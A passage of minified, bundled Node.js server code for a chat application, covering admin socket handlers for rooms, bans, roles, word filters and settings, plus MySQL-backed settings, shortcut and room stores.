                return this.addSelfMessage(e.data);
            case "ADMIN_SELF_MESSAGES_UPDATE":
                return this.updateSelfMessages(e.data);
            case "ADMIN_SELF_MESSAGES_DELETE":
                return this.deleteSelfMessage(e.data);
            case "ADMIN_GREETING_MESSAGES_ADD":
                return this.addGreetingMessage(e.data);
            case "ADMIN_GREETING_MESSAGES_UPDATE":
                return this.updateGreetingMessages(e.data);
            case "ADMIN_GREETING_MESSAGES_DELETE":
                return this.deleteGreetingMessage(e.data);
            case "ADMIN_GREETING_MESSAGES_CHANGE_ICON":
                return this.changeIconGreetingMessage(e.data);
            case "ADMIN_SHORTCUTS_ADD":
                return this.addShortcut(e.data);
            case "ADMIN_SHORTCUTS_UPDATE":
                return this.updateShortcut(e.data);
            case "ADMIN_SHORTCUTS_REMOVE":
                return this.removehortcut(e.data);
            case "ADMIN_RESET_SETTINGS":
                return this.resetSettings(e.data);
            case "ADMIN_RESET_MIC_SETTINGS":
                return this.resetMicSettings(e.data);
            case "ADMIN_RESTART_APACHE":
                return this.restartApache(e.data);
            case "ADMIN_RESET_USER_BACKGROUNDS":
                return this.resetUserBackgrounds(e.data);
            case "ADMIN_RESET_USER_AVATAR_BACKGROUNDS":
                return this.resetUserAvatarBackgrounds(e.data);
            default:
                return null
        }
    }
    s(9).exec, o.prototype.createRoom = function(e) {
        if (e && e.room) {
            if (r.isXSS(e.room.name) || r.isXSS(e.room.description) || r.isXSS(e.room.welcome)) return;
            const t = this.store.rooms.add(e.room);
            t && this.store.users.forEach(e => {
                e.socket.emit("res", r.enc({
                    type: "NEW_ROOM_CREATED",
                    data: {
                        room: t.parse(e, this.store.users)
                    }
                }))
            })
        }
    }, o.prototype.updateRooms = function(e) {
        if (e && Array.isArray(e.rooms)) {
            const t = [];
            e.rooms.forEach(e => {
                if (!r.isXSS(e.name) && !r.isXSS(e.description) && !r.isXSS(e.welcome)) {
                    const s = this.store.rooms.edit(e);
                    s && t.push(s.parse())
                }
            }), t.length && this.store.io.emit("res", r.enc({
                type: "ROOMS_UPDATED",
                data: {
                    rooms: t
                }
            }))
        }
    }, o.prototype.updateRoomFlag = function(e) {
        if (e && e.id && e.flag) {
            if (r.isXSS(e.flag)) return;
            const t = this.store.rooms.all().filter(t => t.id == e.id)[0];
            t && (t.flag = e.flag, this.store.users.forEach(e => {
                this.store.io.emit("res", r.enc({
                    type: "ADMIN_ROOM_FLAG_UPDATED",
                    data: {
                        room: t.parse(e, this.store.users)
                    }
                }))
            }))
        }
    }, o.prototype.deleteRoom = function(e) {
        if (e && Array.isArray(e.deleteds)) {
            const t = [];
            e.deleteds.forEach(e => {
                (e = this.store.rooms.remove(e)) && t.push(e)
            }), t.length && this.store.io.emit("res", r.enc({
                type: "ADMIN_ROOM_DELETED",
                data: {
                    ids: t
                }
            }))
        }
    }, o.prototype.setDefaultRoomFlag = function(e) {
        e && e.flag && (this.store.settings.set("default_rooms_flag", e.flag), this.store.rooms.all().filter(e => null == e.flag).map(e => e.parse()).length && this.store.users.forEach(e => {
            const t = this.store.rooms.all().filter(e => null == e.flag).map(t => t.parse(e, this.store.users));
            this.store.io.emit("res", r.enc({
                type: "ROOMS_UPDATED",
                data: {
                    rooms: t
                }
            }))
        }), this.handler())
    }, o.prototype.clearBanneds = function(e) {
        e && (e.isTruncated ? (this.store.bannedIps = [], this.store.bannedDevices = [], this.store.bannedDeviceUUIDs = []) : (e.ip && (this.store.bannedIps = this.store.bannedIps.filter(t => t != e.ip)), e.device && (this.store.bannedDevices = this.store.bannedDevices.filter(t => t != e.device)), e.deviceUUID && (this.store.bannedDevices = this.store.bannedDeviceUUIDs.filter(t => t != e.deviceUUID))))
    }, o.prototype.banUser = function(e) {
        e && (e.ip && this.store.bannedIps.push(e.ip), e.device && this.store.bannedDevices.push(e.device), this.handler())
    }, o.prototype.clearMuteds = function(e) {
        e && (e.isTruncated ? (this.store.mutedIps = [], this.store.mutedDevices = []) : (e.ip && (this.store.mutedIps = this.store.mutedIps.filter(t => t != e.ip)), e.device && (this.store.mutedDevices = this.store.mutedDevices.filter(t => t != e.device))), this.handler())
    }, o.prototype.muteUser = function(e) {
        e && (e.ip && this.store.mutedIps.push(e.ip), e.device && this.store.mutedDevices.push(e.device), this.handler())
    }, o.prototype.resetRoles = function(e) {
        e && this.store.permissions.resetRoles()
    }, o.prototype.changeRoleIcon = function(e) {
        e && e.role && e.icon && (this.store.roles.changeIcon(e.role, e.icon), this.store.users.filter(t => t.role == e.role).forEach(e => {
            if (e instanceof i) {
                const t = {
                    icon: e.getIcon()
                };
                this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: e.id,
                        reg_id: e.reg_id,
                        updates: t
                    }
                }))
            }
        }))
    }, o.prototype.removeRoleIcon = function(e) {
        e && e.role && (this.store.roles.removeIcon(e.role), this.store.users.filter(t => t.role == e.role).forEach(e => {
            if (e instanceof i) {
                const t = {
                    icon: e.getIcon()
                };
                this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: e.id,
                        reg_id: e.reg_id,
                        updates: t
                    }
                }))
            }
        }))
    }, o.prototype.resetPermissions = function(e) {
        e && e.roleID && this.store.permissions.updateRole(e.roleID)
    }, o.prototype.filterAddWord = function(e) {
        e && e.word && this.store.wordsFilter.addWord(e.word)
    }, o.prototype.filterUpdateWordType = function(e) {
        e && e.word && this.store.wordsFilter.updateWord(e.word)
    }, o.prototype.filterRemoveWord = function(e) {
        e && e.id && this.store.wordsFilter.removeWord(e.id)
    }, o.prototype.filterResetWords = function(e) {
        this.store.wordsFilter.init().then(e => {
            this.handler()
        }).catch(e => {})
    }, o.prototype.usersUpdateRole = function(e) {
        if (e && e.role && e.user_id) {
            const t = this.store.users.filter(t => t.reg_id == e.user_id)[0];
            if (t) {
                const s = this.store.roles.getRoleName(e.role);
                s && (t.role = e.role, t.socket.emit("res", r.enc({
                    type: "PROFILE_ACTION_CHANGE_ROLE",
                    data: {
                        user: null,
                        roleName: s
                    }
                })), this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: t.id,
                        reg_id: t.reg_id,
                        updates: {
                            role: t.role,
                            power: t.getPower(),
                            icon: t.getIcon()
                        }
                    }
                })))
            }
        }
    }, o.prototype.usersSetDefaultAvatar = function(e) {
        if (e && e.avatar) {
            this.store.settings.set("default_avatar", e.avatar);
            const t = [];
            this.store.users.filter(e => null == e.avatar).forEach(e => {
                t.push({
                    id: e.id,
                    reg_id: e.reg_id,
                    updates: {
                        avatar: e.getAvatar()
                    }
                })
            }), t.length && this.store.io.emit("res", r.enc({
                type: "USERS_UPDATED",
                data: {
                    updates: t
                }
            }))
        }
    }, o.prototype.addVirtualUser = function(e) {
        e && e.user && this.store.virtualUsers.add(e.user)
    }, o.prototype.deleteVirtualUser = function(e) {
        e && Array.isArray(e.deleteds) && e.deleteds.forEach(e => {
            this.store.virtualUsers.remove(e)
        })
    }, o.prototype.logoutVirtualUser = function(e) {
        e && Array.isArray(e.ids) && (e.ids.forEach(e => {
            var t = this.store.users.filter(t => t.isVirtual && t.reg_id == e)[0];
            t instanceof i && t.logout()
        }), this.handler())
    }, o.prototype.resetFaces = function(e) {
        this.store.faces.init().then(e => {
            this.store.io.emit("res", r.enc({
                type: "RESET_FACES",
                data: {
                    faces: e
                }
            }))
        }).catch(e => {})
    }, o.prototype.resetGifts = function(e) {
        this.store.gifts.init().then(e => {
            this.store.io.emit("res", r.enc({
                type: "RESET_GIFTS",
                data: {
                    gifts: e
                }
            }))
        }).catch(e => {})
    }, o.prototype.addSelfMessage = function(e) {
        if (e && e.message) {
            if (r.isXSS(e.message.title) || r.isXSS(e.message.msg)) return;
            this.store.selfMessages.add(e.message)
        }
    }, o.prototype.updateSelfMessages = function(e) {
        e && Array.isArray(e.messages) && e.messages.forEach(e => {
            r.isXSS(e.title) || r.isXSS(e.msg) || this.store.selfMessages.edit(e)
        })
    }, o.prototype.deleteSelfMessage = function(e) {
        e && Array.isArray(e.deleteds) && e.deleteds.forEach(e => {
            this.store.selfMessages.remove(e)
        })
    }, o.prototype.addGreetingMessage = function(e) {
        if (e && e.message) {
            if (r.isXSS(e.message.title) || r.isXSS(e.message.content) || r.isXSS(e.message.room)) return;
            this.store.greetingMessages.add(e.message)
        }
    }, o.prototype.updateGreetingMessages = function(e) {
        e && Array.isArray(e.messages) && e.messages.forEach(e => {
            r.isXSS(e.title) || r.isXSS(e.content) || r.isXSS(e.room) || this.store.greetingMessages.edit(e)
        })
    }, o.prototype.deleteGreetingMessage = function(e) {
        e && Array.isArray(e.deleteds) && e.deleteds.forEach(e => {
            this.store.greetingMessages.remove(e)
        })
    }, o.prototype.changeIconGreetingMessage = function(e) {
        e && e.id && this.store.greetingMessages.changeIcon(e)
    }, o.prototype.addShortcut = function(e) {
        e && e.shortcut && this.store.shortcuts.add(e.shortcut)
    }, o.prototype.updateShortcut = function(e) {
        e && Array.isArray(e.shortcuts) && (e.shortcuts.forEach(e => {
            this.store.shortcuts.edit(e)
        }), this.handler())
    }, o.prototype.removehortcut = function(e) {
        e && e.ids && this.store.shortcuts.remove(e.ids)
    }, o.prototype.resetSettings = function(e) {
        this.store.settings.init().then(() => {
            this.store.io.emit("res", r.enc({
                type: "SET_SETTINGS",
                data: {
                    settings: this.store.settings.parse()
                }
            })), this.handler()
        }).catch(e => {})
    }, o.prototype.resetMicSettings = function(e) {
        this.store.users.forEach(e => {
            this.store.radio.unRequestMic(e), this.store.radio.stopListening(e), e && e.room && this.store.settings.get("is_mic_enabled") && (this.store.settings.get("mic_room") || this.store.radio.startListening(e), this.store.settings.get("mic_room") == e.room.id && this.store.radio.startListening(e))
        })
    }, o.prototype.restartApache = function(e) {
        return this.handler()
    }, o.prototype.resetUserBackgrounds = function(e) {
        this.store.userBackgrounds.init().then(e => {
            this.store.io.emit("res", r.enc({
                type: "RESET_USER_BACKGROUNDS",
                data: {
                    backgrounds: e
                }
            }))
        }).catch(e => {})
    }, o.prototype.resetUserAvatarBackgrounds = function(e) {
        this.store.userAvatarBackgrounds.init().then(e => {
            this.store.io.emit("res", r.enc({
                type: "RESET_USER_AVATAR_BACKGROUNDS",
                data: {
                    backgrounds: e
                }
            }))
        }).catch(e => {})
    }, o.prototype.isValidToken = function(e) {
        return !!this.store.adminTokens.filter(t => t == e)[0]
    }, o.prototype.installSSL = function(e, t) {
        return this.handler()
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0),
        i = s(1);

    function o(e, t, s) {
        if (this.socket = t, this.store = s, this.handler = e.handler, r.check(s, t), this.isValidAdminHash(e.data.admin_hash)) switch (e.type) {
            case "ADMIN_ROOM_CREATE":
                return this.createRoom(e.data);
            case "ADMIN_ROOM_UPDATE":
                return this.updateRooms(e.data);
            case "ADMIN_ROOM_UPDATE_FLAG":
                return this.updateRoomFlag(e.data);
            case "ADMIN_ROOM_DELETE":
                return this.deleteRoom(e.data);
            case "ADMIN_ROOMS_SET_DEFAULT_FLAG":
                return this.setDefaultRoomFlag(e.data);
            case "ADMIN_BANNEDS_CLEAR":
                return this.clearBanneds(e.data);
            case "ADMIN_ROLES_RESET":
                return this.resetRoles(e.data);
            case "ADMIN_ROLE_CHANGE_ICON":
                return this.changeRoleIcon(e.data);
            case "ADMIN_PERMISSIONS_RESET":
                return this.resetPermissions(e.data);
            case "ADMIN_WORDS_ADD":
                return this.filterAddWord(e.data);
            case "ADMIN_WORDS_UPDATE_TYPE":
                return this.filterUpdateWordType(e.data);
            case "ADMIN_WORDS_REMOVE":
                return this.filterRemoveWord(e.data);
            case "ADMIN_WORDS_RESET":
                return this.filterResetWords(e.data);
            case "ADMIN_WALL_CLEAR":
                return this.clearWall(e.data);
            case "ADMIN_USERS_UPDATE_ROLE":
                return this.usersUpdateRole(e.data);
            case "ADMIN_USERS_SET_DEFAULT_AVATAR":
                return this.usersSetDefaultAvatar(e.data);
            case "ADMIN_VIRTUAL_USERS_ADD":
                return this.addVirtualUser(e.data);
            case "ADMIN_VIRTUAL_USERS_DELETE":
                return this.deleteVirtualUser(e.data);
            case "ADMIN_VIRTUAL_USERS_LOGOUT":
                return this.logoutVirtualUser(e.data);
            case "ADMIN_RESET_FACES":
                return this.resetFaces(e.data);
            case "ADMIN_RESET_GIFTS":
                return this.resetGifts(e.data);
            case "ADMIN_SELF_MESSAGES_ADD":
                return this.addSelfMessage(e.data);
            case "ADMIN_SELF_MESSAGES_UPDATE":
                return this.updateSelfMessages(e.data);
            case "ADMIN_SELF_MESSAGES_DELETE":
                return this.deleteSelfMessage(e.data);
            case "ADMIN_SHORTCUTS_ADD":
                return this.addShortcut(e.data);
            case "ADMIN_SHORTCUTS_UPDATE":
                return this.updateShortcut(e.data);
            case "ADMIN_SHORTCUTS_REMOVE":
                return this.removehortcut(e.data);
            case "ADMIN_RESET_SETTINGS":
                return this.resetSettings(e.data);
            default:
                return null
        }
    }
    o.prototype.createRoom = function(e) {
        if (e && e.room) {
            if (r.isXSS(e.room.name) || r.isXSS(e.room.description) || r.isXSS(e.room.welcome)) return;
            const t = this.store.rooms.add(e.room);
            t && this.store.users.forEach(e => {
                e.socket.emit("res", r.enc({
                    type: "NEW_ROOM_CREATED",
                    data: {
                        room: t.parse(e, this.store.users)
                    }
                }))
            })
        }
    }, o.prototype.updateRooms = function(e) {
        if (e && Array.isArray(e.rooms)) {
            const t = [];
            e.rooms.forEach(e => {
                if (!r.isXSS(e.name) && !r.isXSS(e.description) && !r.isXSS(e.welcome)) {
                    const s = this.store.rooms.edit(e);
                    s && t.push(s.parse())
                }
            }), t.length && this.store.io.emit("res", r.enc({
                type: "ROOMS_UPDATED",
                data: {
                    rooms: t
                }
            }))
        }
    }, o.prototype.updateRoomFlag = function(e) {
        if (e && e.id && e.flag) {
            if (r.isXSS(e.flag)) return;
            const t = this.store.rooms.all().filter(t => t.id == e.id)[0];
            t && (t.flag = e.flag, this.store.users.forEach(e => {
                this.store.io.emit("res", r.enc({
                    type: "ADMIN_ROOM_FLAG_UPDATED",
                    data: {
                        room: t.parse(e, this.store.users)
                    }
                }))
            }))
        }
    }, o.prototype.deleteRoom = function(e) {
        if (e && Array.isArray(e.deleteds)) {
            const t = [];
            e.deleteds.forEach(e => {
                (e = this.store.rooms.remove(e)) && t.push(e)
            }), t.length && this.store.io.emit("res", r.enc({
                type: "ADMIN_ROOM_DELETED",
                data: {
                    ids: t
                }
            }))
        }
    }, o.prototype.setDefaultRoomFlag = function(e) {
        e && e.flag && (this.store.settings.set("default_rooms_flag", e.flag), this.store.rooms.all().filter(e => null == e.flag).map(e => e.parse()).length && this.store.users.forEach(e => {
            const t = this.store.rooms.all().filter(e => null == e.flag).map(t => t.parse(e, this.store.users));
            this.store.io.emit("res", r.enc({
                type: "ROOMS_UPDATED",
                data: {
                    rooms: t
                }
            }))
        }), this.handler())
    }, o.prototype.clearBanneds = function(e) {
        e && (e.isTruncated ? (this.store.bannedIps = [], this.store.bannedDevices = []) : (e.ip && (this.store.bannedIps = this.store.bannedIps.filter(t => t != e.ip)), e.device && (this.store.bannedDevices = this.store.bannedDevices.filter(t => t != e.device))))
    }, o.prototype.resetRoles = function(e) {
        e && this.store.permissions.resetRoles()
    }, o.prototype.changeRoleIcon = function(e) {
        e && e.role && e.icon && (this.store.roles.changeIcon(e.role, e.icon), this.store.users.filter(t => t.role == e.role).forEach(e => {
            if (e instanceof i) {
                const t = {
                    icon: e.getIcon()
                };
                this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: e.id,
                        reg_id: e.reg_id,
                        updates: t
                    }
                }))
            }
        }))
    }, o.prototype.resetPermissions = function(e) {
        e && e.roleID && this.store.permissions.updateRole(e.roleID)
    }, o.prototype.filterAddWord = function(e) {
        e && e.word && this.store.wordsFilter.addWord(e.word)
    }, o.prototype.filterUpdateWordType = function(e) {
        e && e.word && this.store.wordsFilter.updateWord(e.word)
    }, o.prototype.filterRemoveWord = function(e) {
        e && e.id && this.store.wordsFilter.removeWord(e.id)
    }, o.prototype.filterResetWords = function(e) {
        this.store.wordsFilter.init().then(e => {
            this.handler()
        }).catch(e => {})
    }, o.prototype.clearWall = function(e) {
        this.store.io.emit("res", r.enc({
            type: "CLEAR_WALL",
            data: {}
        }))
    }, o.prototype.usersUpdateRole = function(e) {
        if (e && e.role && e.user_id) {
            const t = this.store.users.filter(t => t.reg_id == e.user_id)[0];
            if (t) {
                const s = this.store.roles.getRoleName(e.role);
                s && (t.role = e.role, t.socket.emit("res", r.enc({
                    type: "PROFILE_ACTION_CHANGE_ROLE",
                    data: {
                        user: null,
                        roleName: s
                    }
                })), this.store.io.emit("res", r.enc({
                    type: "USER_UPDATED",
                    data: {
                        id: t.id,
                        reg_id: t.reg_id,
                        updates: {
                            role: t.role,
                            power: t.getPower(),
                            icon: t.getIcon()
                        }
                    }
                })))
            }
        }
    }, o.prototype.usersSetDefaultAvatar = function(e) {
        if (e && e.avatar) {
            this.store.settings.set("default_avatar", e.avatar);
            const t = [];
            this.store.users.filter(e => null == e.avatar).forEach(e => {
                t.push({
                    id: e.id,
                    reg_id: e.reg_id,
                    updates: {
                        avatar: e.getAvatar()
                    }
                })
            }), t.length && this.store.io.emit("res", r.enc({
                type: "USERS_UPDATED",
                data: {
                    updates: t
                }
            }))
        }
    }, o.prototype.addVirtualUser = function(e) {
        e && e.user && this.store.virtualUsers.add(e.user)
    }, o.prototype.deleteVirtualUser = function(e) {
        e && Array.isArray(e.deleteds) && e.deleteds.forEach(e => {
            this.store.virtualUsers.remove(e)
        })
    }, o.prototype.logoutVirtualUser = function(e) {
        e && Array.isArray(e.ids) && (e.ids.forEach(e => {
            var t = this.store.users.filter(t => t.isVirtual && t.reg_id == e)[0];
            t instanceof i && t.logout()
        }), this.handler())
    }, o.prototype.resetFaces = function(e) {
        this.store.faces.init().then(e => {
            this.store.io.emit("res", r.enc({
                type: "RESET_FACES",
                data: {
                    faces: e
                }
            }))
        }).catch(e => {})
    }, o.prototype.resetGifts = function(e) {
        this.store.gifts.init().then(e => {
            this.store.io.emit("res", r.enc({
                type: "RESET_GIFTS",
                data: {
                    gifts: e
                }
            }))
        }).catch(e => {})
    }, o.prototype.addSelfMessage = function(e) {
        if (e && e.message) {
            if (r.isXSS(e.message.title) || r.isXSS(e.message.msg)) return;
            this.store.selfMessages.add(e.message)
        }
    }, o.prototype.updateSelfMessages = function(e) {
        e && Array.isArray(e.messages) && e.messages.forEach(e => {
            r.isXSS(e.title) || r.isXSS(e.msg) || this.store.selfMessages.edit(e)
        })
    }, o.prototype.deleteSelfMessage = function(e) {
        e && Array.isArray(e.deleteds) && e.deleteds.forEach(e => {
            this.store.selfMessages.remove(e)
        })
    }, o.prototype.addShortcut = function(e) {
        e && e.shortcut && this.store.shortcuts.add(e.shortcut)
    }, o.prototype.updateShortcut = function(e) {
        e && Array.isArray(e.shortcuts) && (e.shortcuts.forEach(e => {
            this.store.shortcuts.edit(e)
        }), this.handler())
    }, o.prototype.removehortcut = function(e) {
        e && e.ids && this.store.shortcuts.remove(e.ids)
    }, o.prototype.resetSettings = function(e) {
        this.store.settings.init().then(() => {
            this.store.io.emit("res", r.enc({
                type: "SET_SETTINGS",
                data: {
                    settings: this.store.settings.parse()
                }
            }))
        }).catch(e => {})
    }, o.prototype.isValidToken = function(e) {
        return !!this.store.adminTokens.filter(t => t == e)[0]
    }, o.prototype.isValidAdminHash = function(e) {
        return this.store.config.adminHash == e
    }, e.exports = o
}, function(e, t) {
    e.exports = require("mysql")
}, function(e, t) {
    e.exports = require("empty-folder")
}, function(e, t) {
    e.exports = require("socket.io")
}, function(e, t, s) {
    const r = s(0);

    function i(e) {
        this.db = e.db, this.data = [], this.domains = [], this.defaultDomain = {}, this.init().catch(e => {})
    }
    i.prototype.init = function() {
        var e = this;
        return new Promise((function(t, s) {
            e.db.query("SELECT * FROM domains", [], (function(r, i) {
                try {
                    if (!r && i && i.length)
                        for (var o = 0; o < i.length; o++) 0 == o && (e.defaultDomain.id = i[o].id, e.defaultDomain.name = i[o].name), e.domains[i[o].id] = i[o].name;
                    e.db.query("SELECT * FROM settings", [], (function(r, i) {
                        try {
                            if (!r && i && i.length)
                                for (var o = 0; o < i.length; o++) e.data[e.domains[i[o].domain_id]] = i[o], t(i[0]);
                            else s(r)
                        } catch (e) {
                            s(e)
                        }
                    }))
                } catch (e) {}
            }))
        }))
    }, i.prototype.getDefaultUserAvatar = function(e) {
        try {
            return e ? this.data[e].default_avatar ? "/uploads/avatars/" + this.data[e].default_avatar : "/images/none.png" : this.data[this.defaultDomain.name].default_avatar ? "/uploads/avatars/" + this.data[this.defaultDomain.name].default_avatar : "/images/none.png"
        } catch (e) {
            return "/images/none.png"
        }
    }, i.prototype.getDefaultRoomsFlag = function() {
        try {
            return this.data[this.defaultDomain.name].default_rooms_flag ? "/uploads/rooms/" + this.data[this.defaultDomain.name].default_rooms_flag : "/images/default_room.png"
        } catch (e) {
            return "/images/default_room.png"
        }
    }, i.prototype.get = function(e, t) {
        return t && this.data[t] ? this.data[t][e] : this.data[this.defaultDomain.name][e]
    }, i.prototype.set = function(e, t, s) {
        if (!r.isXSS(t)) return s ? this.data[s][e] = t : this.data[this.defaultDomain.name][e] = t
    }, i.prototype.parse = function() {
        const e = {};
        for (var t = 0; t < this.domains.length; t++) this.domains[t] && (e[this.domains[t]] = {
            chat_keywords: this.get("chat_keywords", this.domains[t]),
            chat_title: this.get("chat_title", this.domains[t]),
            chat_desc: this.get("chat_desc", this.domains[t]),
            chat_name: this.get("chat_name", this.domains[t]),
            css_link: this.get("css_link", this.domains[t]),
            css: this.get("css", this.domains[t]),
            html: this.get("html", this.domains[t]),
            javascript: this.get("javascript", this.domains[t]),
            chat_background: this.get("chat_background", this.domains[t]),
            background_color: this.get("background_color", this.domains[t]),
            show_chat_background: this.get("show_chat_background", this.domains[t]),
            show_chat_background_on_windows: this.get("show_chat_background_on_windows", this.domains[t]),
            show_interface_background: this.get("show_interface_background", this.domains[t]),
            interface_background: this.get("interface_background", this.domains[t]),
            show_banner: this.get("show_banner", this.domains[t]),
            banner_img: this.get("banner_img", this.domains[t]),
            btn_color: this.get("btn_color", this.domains[t]),
            window_color: this.get("window_color", this.domains[t]),
            content_color: this.get("content_color", this.domains[t]),
            border_color: this.get("border_color", this.domains[t]),
            default_rooms_flag: this.get("default_rooms_flag", this.domains[t]),
            rooms_greeting_title: this.get("rooms_greeting_title", this.domains[t]),
            default_avatar: this.get("default_avatar", this.domains[t]),
            marquee_bg_color: this.get("marquee_bg_color", this.domains[t]),
            marquee_text_color: this.get("marquee_text_color", this.domains[t]),
            marquee_content: this.get("marquee_content", this.domains[t]),
            disable_marquee: this.get("disable_marquee", this.domains[t]),
            show_wall_banner: this.get("show_wall_banner", this.domains[t]),
            wall_banner_msg: this.get("wall_banner_msg", this.domains[t]),
            wall_banner_background_color: this.get("wall_banner_background_color", this.domains[t]),
            wall_banner_font_color: this.get("wall_banner_font_color", this.domains[t]),
            is_radio_stream_enabled: this.get("is_radio_stream_enabled", this.domains[t]),
            radio_stream_url: this.get("radio_stream_url", this.domains[t]),
            radio_stream_on_img: this.get("radio_stream_on_img", this.domains[t]),
            radio_stream_off_img: this.get("radio_stream_off_img", this.domains[t]),
            self_messages_icon: this.get("self_messages_icon", this.domains[t]),
            self_message_bg_color: this.get("self_message_bg_color", this.domains[t]),
            self_message_title_color: this.get("self_message_title_color", this.domains[t]),
            self_message_content_color: this.get("self_message_content_color", this.domains[t]),
            disable_floating_particles: this.get("disable_floating_particles", this.domains[t]),
            is_fixed_login_enabled: this.get("is_fixed_login_enabled", this.domains[t]),
            required_likes_to_change_name_status: this.get("required_likes_to_change_name_status", this.domains[t]),
            required_likes_to_change_avatar: this.get("required_likes_to_change_avatar", this.domains[t]),
            username_register_length: this.get("username_register_length", this.domains[t]),
            username_guest_length: this.get("username_guest_length", this.domains[t]),
            required_likes_public: this.get("required_likes_public", this.domains[t]),
            time_between_messages: this.get("time_between_messages", this.domains[t]),
            public_msg_length: this.get("public_msg_length", this.domains[t]),
            tv_box_url: this.get("tv_box_url", this.domains[t]),
            tv_box_title: this.get("tv_box_title", this.domains[t]),
            tv_box_enabled: this.get("tv_box_enabled", this.domains[t]),
            is_mic_enabled: this.get("is_mic_enabled", this.domains[t]),
            mic_room: this.get("mic_room", this.domains[t]),
            wall_msg_count: this.get("wall_msg_count", this.domains[t]),
            youtube_url: this.get("youtube_url", this.domains[t])
        });
        return e
    }, e.exports = i
}, function(e, t, s) {
    const r = s(0);

    function i(e) {
        this.db = e.db, this.init(), this.shortcuts = []
    }
    i.prototype.init = function() {
        var e = this;
        return new Promise((function(t, s) {
            e.db.query("SELECT * FROM shortcuts", [], (function(r, i) {
                try {
                    if (!r && i && i.length) {
                        for (var o in e.shortcuts = [], i) {
                            var n = i[o];
                            e.shortcuts.push({
                                id: n.id,
                                key: n.key,
                                value: n.value
                            })
                        }
                        t(e.shortcuts)
                    } else s("no shortcuts found")
                } catch (e) {
                    s(e)
                }
            }))
        }))
    }, i.prototype.all = function() {
        return this.shortcuts
    }, i.prototype.keys = function() {
        return this.shortcuts.map(e => e.key)
    }, i.prototype.values = function() {
        return this.shortcuts.map(e => e.value)
    }, i.prototype.parse = function(e) {
        try {
            const t = e.split(" ");
            if (!t.length) return "";
            let s = "";
            return this.values().length ? (t.forEach(e => {
                if (e.trim().length) {
                    const t = this.keys().indexOf(e);
                    s += t >= 0 ? " " + this.values()[t] : " " + e
                }
            }), " " == s.charAt(0) ? s.replace(" ", "") : s) : e
        } catch (e) {
            return console.log(e.stack), ""
        }
    }, i.prototype.add = function(e) {
        return !(!(e && e.id && e.key && e.value) || r.isXSS(e.key) || r.isXSS(e.value) || (this.shortcuts.push({
            id: e.id,
            key: e.key,
            value: e.value
        }), 0))
    }, i.prototype.edit = function(e) {
        return !!(e && e.id && e.key && e.value) && !r.isXSS(e.key) && !r.isXSS(e.value) && void(this.shortcuts = this.shortcuts.map(t => (t.id == e.id && (t.key = e.key, t.value = e.value), t)))
    }, i.prototype.remove = function(e) {
        return !!Array.isArray(e) && (e.forEach(e => {
            this.shortcuts = this.shortcuts.filter(t => t.id != e)
        }), !0)
    }, e.exports = i
}, function(e, t, s) {
    const r = s(44),
        i = s(0);

    function o(e) {
        this.settings = e.settings, this.db = e.db, this.shortcuts = e.shortcuts, this.rooms = [], this.init().catch(e => {}), this.defaultRoomsCount = 0
    }
    o.prototype.init = function() {
        var e = this;
        return new Promise((function(t, s) {
            e.db.query("SELECT * FROM rooms", [], (function(o, n) {
                try {
                    if (!o && n && n.length) {
                        for (var a in n) {
                            const t = n[a];
                            t.default && e.defaultRoomsCount++, e.rooms.push(new r({
                                id: t.id,
                                name: t.name,
                                is_voice_room: t.is_voice_room,
                                password: t.password,
                                required_likes: t.required_likes,
                                welcome: i.sanitize(t.welcome, e.shortcuts),
                                description: t.description,
                                capacity: t.capacity,
                                default: t.default,
                                flag: t.flag,
                                target: t.target
                            }, e.settings))
                        }
                        t(e.rooms)
                    } else s(o)
                } catch (e) {
                    s(e)
                }
            }))
        }))
    }, o.prototype.getDefault = function(e, t) {
        const s = this.rooms.filter(s => !!s.default && !s.isFull(e, t)).sort((e, t) => e.id > t.id ? 1 : -1)[0];
        if (s) return s;
        {
            const e = this.rooms.filter(e => !!e.default).sort((e, t) => e.id > t.id ? 1 : -1)[0];
            this.defaultRoomsCount++;
            const t = new r({
                id: Date.now(),
                name: e.name + " ( " + this.defaultRoomsCount + " )",
                welcome: i.sanitize(e.welcome, this.shortcuts),
                description: e.description,
                is_voice_room: e.is_voice_room,
                required_likes: e.required_likes,
                default: !0
            }, this.settings);
            return this.rooms.push(t), t
        }
    }, o.prototype.getHeighestID = function() {
        let e = 0;
        return this.rooms.reduce((t, s) => t.id > s.id ? (e = t.id, t) : s.id > t.id ? (e = s.id, s) : void 0), e
    }, o.prototype.all = function() {
        return this.rooms
    }, o.prototype.get = function(e) {
        return this.rooms.filter(t => t.id == e)[0]
    }, o.prototype.insertToDB = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.db.query("INSERT INTO rooms (`name`, `password`, `required_likes`, `welcome`, `description`, `capacity`) VALUES (?, ?, ?, ?, ?, ?)", [e.name, e.password, e.required_likes, e.welcome, e.description, e.capacity], (e, t) => {
                e && r(e), s(t)
            })
        })
    }, o.prototype.remvoeFromDB = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.db.query("DELETE FROM rooms WHERE id = ? AND `default` = 0", [e], (e, t) => {
                e && r(e), s(t)
            })
        })
    }, o.prototype.save = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.db.query("UPDATE rooms SET `name` = ?, `is_voice_room` = ?, `password` = ?, `required_likes` = ?, `welcome` = ?, `description` = ?, `capacity` = ? WHERE id = ?", [e.name, e.is_voice_room, e.password, e.required_likes, e.welcome, e.description, e.capacity, e.id], (e, t) => {
                e && r(e), s(t)
            })
        })
    }, o.prototype.add = function(e) {
        if (e && "object" == typeof e) {
            e.welcome = i.sanitize(e.welcome, this.shortcuts);
            const t = new r(e, this.settings);
            return t.removeWhenEmpty = "boolean" != typeof e.isPermanent || !e.isPermanent, this.rooms.push(t), t
        }
        return null
    }, o.prototype.edit = function(e) {
        if (e && "object" == typeof e) {
            let t = null;
            return this.rooms = this.rooms.map(s => (s.id == e.id && (s.welcome = i.sanitize(e.welcome, this.shortcuts), s.description = e.description, s.name = e.name, s.is_voice_room = e.is_voice_room, s.password = e.password, s.required_likes = e.required_likes, s.capacity = e.capacity, s.flag = e.flag, s.target = e.target, t = s), s)), t
        }
        return null
    }, o.prototype.remove = function(e, t) {
        if (e) {
            let s = !1;
            return this.rooms.forEach(r => {
